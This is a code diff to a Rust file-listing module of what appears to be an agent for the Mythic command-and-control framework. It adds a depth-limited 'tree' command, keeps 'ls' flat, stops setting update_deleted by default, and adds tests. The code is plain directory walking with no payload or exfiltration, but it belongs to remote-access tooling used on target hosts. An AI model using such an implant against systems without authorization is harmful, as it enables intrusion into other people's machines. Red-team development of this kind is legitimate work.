@@ -3,8 +3,7 @@
 //! Task parameters (JSON):
 //! ```json
 //! {
-//!     "path": "/home/user",
-//!     "recursive": false
+//!     "path": "/home/user"
 //! }
 //! ```
 //!
@@ -40,7 +39,7 @@ struct Params {
     #[serde(default)]
     host: Option<String>,
     #[serde(default)]
-    recursive: bool,
+    depth: Option<u32>,
 }
 
 fn default_path() -> String {
@@ -188,12 +187,15 @@ fn list_dir_flat(dir: &Path) -> Result<Vec<FileBrowserEntry>, String> {
 }
 
 /// Recursive walk: collect all files and dirs with relative paths.
-fn walk_dir_recursive(root: &Path) -> Result<Vec<FileBrowserEntry>, String> {
+fn walk_dir_recursive(root: &Path, max_depth: u32) -> Result<Vec<FileBrowserEntry>, String> {
     let mut files = Vec::new();
-    let mut dirs: Vec<(std::path::PathBuf, String)> = Vec::new();
-    dirs.push((root.to_path_buf(), String::new()));
+    let mut dirs: Vec<(std::path::PathBuf, String, u32)> = Vec::new();
+    dirs.push((root.to_path_buf(), String::new(), 0));
 
-    while let Some((dir, prefix)) = dirs.pop() {
+    while let Some((dir, prefix, depth)) = dirs.pop() {
+        if depth >= max_depth {
+            continue;
+        }
         let rd = fs::read_dir(&dir)
             .map_err(|e| format!("read_dir {} failed: {e}", render_path(&dir)))?;
         for entry in rd.flatten() {
@@ -201,9 +203,10 @@ fn walk_dir_recursive(root: &Path) -> Result<Vec<FileBrowserEntry>, String> {
             if let Some(fb) = entry_from_direntry(&entry, &prefix) {
                 let is_file = fb.is_file;
                 files.push(fb);
-                if !is_file {
+                let entry_depth = depth + 1;
+                if !is_file && entry_depth < max_depth {
                     let child_prefix = join_display(&prefix, &name);
-                    dirs.push((entry.path(), child_prefix));
+                    dirs.push((entry.path(), child_prefix, entry_depth));
                 }
             }
         }
@@ -215,6 +218,60 @@ fn walk_dir_recursive(root: &Path) -> Result<Vec<FileBrowserEntry>, String> {
 // ── Main handler ────────────────────────────────────────────
 
 pub fn handle(task: &TaskMessage) -> TaskResponse {
+    handle_with_mode(task, false)
+}
+
+pub fn handle_tree(task: &TaskMessage) -> TaskResponse {
+    let params = match serde_json::from_str::<Params>(&task.parameters) {
+        Ok(p) => p,
+        Err(e) => return TaskResponse::failed(task.id, &format!("tree parse error: {e}")),
+    };
+
+    let input_path = normalize_user_path(&params.path);
+    let resolved = resolve_path(&input_path);
+    let meta = match fs::metadata(&resolved) {
+        Ok(m) => m,
+        Err(e) => {
+            return TaskResponse::failed(
+                task.id,
+                &format!("cannot access {}: {e}", render_path(&resolved)),
+            );
+        }
+    };
+
+    if meta.is_file() {
+        return TaskResponse {
+            task_id: task.id,
+            completed: Some(true),
+            status: Some("completed".into()),
+            user_output: Some(render_path(&resolved)),
+            ..Default::default()
+        };
+    }
+
+    let depth = params.depth.unwrap_or(3);
+    let mut files = match walk_dir_recursive(&resolved, depth) {
+        Ok(files) => files,
+        Err(e) => return TaskResponse::failed(task.id, &e),
+    };
+    files.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
+
+    let mut lines = vec![render_path(&resolved)];
+    for entry in files {
+        let marker = if entry.is_file { "FILE" } else { "DIR " };
+        lines.push(format!("{marker} {}", entry.name));
+    }
+
+    TaskResponse {
+        task_id: task.id,
+        completed: Some(true),
+        status: Some("completed".into()),
+        user_output: Some(lines.join("\n")),
+        ..Default::default()
+    }
+}
+
+fn handle_with_mode(task: &TaskMessage, recursive: bool) -> TaskResponse {
     let params = match serde_json::from_str::<Params>(&task.parameters) {
         Ok(p) => p,
         Err(e) => return TaskResponse::failed(task.id, &format!("ls parse error: {e}")),
@@ -264,7 +321,6 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             modify_time: meta.modified().ok().and_then(to_millis),
             permissions: permissions_value(&meta),
             success: Some(true),
-            update_deleted: true,
             ..Default::default()
         };
         TaskResponse {
@@ -275,9 +331,9 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
             ..Default::default()
         }
     } else {
-        // Directory listing — walk recursively if requested
-        let children = if params.recursive {
-            walk_dir_recursive(&resolved)
+        // Directory listing — tree uses recursive mode; ls stays flat.
+        let children = if recursive {
+            walk_dir_recursive(&resolved, params.depth.unwrap_or(3))
         } else {
             list_dir_flat(&resolved)
         };
@@ -311,7 +367,12 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
                 host,
                 parent_path,
                 success: Some(true),
-                update_deleted: true,
+                // Do not default update_deleted=true here. Mythic's
+                // server-side file-browser cleanup searches by
+                // operation/host/path and updates existing rows without
+                // limiting to the current callback. On hosts with old
+                // callbacks, that causes a fresh ls to mutate stale
+                // callback trees and pollute the File Browser UI.
                 files,
                 ..Default::default()
             }),
@@ -399,6 +460,60 @@ mod tests {
             resp.user_output.is_none(),
             "user_output must be None to avoid double-display"
         );
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_ls_does_not_default_update_deleted() {
+        let dir = unique_tmp("no-update-deleted");
+        std::fs::write(dir.join("hello.txt"), b"hi").unwrap();
+        let task = TaskMessage {
+            command: "ls".into(),
+            parameters: serde_json::json!({ "path": dir.to_string_lossy() }).to_string(),
+            ..Default::default()
+        };
+        let resp = handle(&task);
+        let fb = resp.file_browser.expect("file_browser set");
+        assert!(!fb.update_deleted);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_ls_stays_flat_even_with_legacy_recursive_param() {
+        let dir = unique_tmp("flat");
+        std::fs::create_dir_all(dir.join("nested")).unwrap();
+        std::fs::write(dir.join("nested").join("deep.txt"), b"hi").unwrap();
+        let task = TaskMessage {
+            command: "ls".into(),
+            parameters: serde_json::json!({
+                "path": dir.to_string_lossy(),
+                "recursive": true,
+            })
+            .to_string(),
+            ..Default::default()
+        };
+        let resp = handle(&task);
+        let fb = resp.file_browser.expect("file_browser set");
+        assert!(fb.files.iter().any(|f| f.name == "nested"));
+        assert!(!fb.files.iter().any(|f| f.name.contains("deep.txt")));
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[test]
+    fn test_tree_walks_recursively() {
+        let dir = unique_tmp("tree");
+        std::fs::create_dir_all(dir.join("nested")).unwrap();
+        std::fs::write(dir.join("nested").join("deep.txt"), b"hi").unwrap();
+        let task = TaskMessage {
+            command: "tree".into(),
+            parameters: serde_json::json!({ "path": dir.to_string_lossy() }).to_string(),
+            ..Default::default()
+        };
+        let resp = handle_tree(&task);
+        assert!(resp.file_browser.is_none());
+        let output = resp.user_output.unwrap_or_default();
+        assert!(output.contains("nested"));
+        assert!(output.contains("deep.txt"));
         let _ = std::fs::remove_dir_all(&dir);
     }
 }
